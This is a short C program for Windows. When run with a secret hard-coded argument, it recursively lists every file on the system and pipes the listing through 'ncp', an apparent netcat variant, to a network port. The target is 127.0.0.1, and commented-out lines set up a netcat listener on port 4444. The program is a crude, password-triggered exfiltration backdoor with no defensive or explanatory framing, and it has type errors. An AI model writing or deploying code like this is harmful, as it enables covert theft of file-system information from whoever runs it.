#include<stdio.h>
#include<windows.h>
#include<string.h>
main(int argc, char *argv[])
{
    int i=0;
    FILE *fp;
    if(argc > 1)
    {
    if(!strcmp(argv[1],"jabssfkueg54af"))
    {
    //fp = popen("ncp -v -l -p 4444","r"); //This returns the output to the stream
    char command[150],*out[500];
   // strcpy(command, "ncp -v -l -p 4444 > stdout");
    //system(command);
    strcpy(command,"dir /s /b /a | ");
    strcat(command, "ncp 127.0.0.1 6666");
    fp = popen(command,"r");
    fgets(out,10,fp);
    pclose(fp);
    }
    }
}

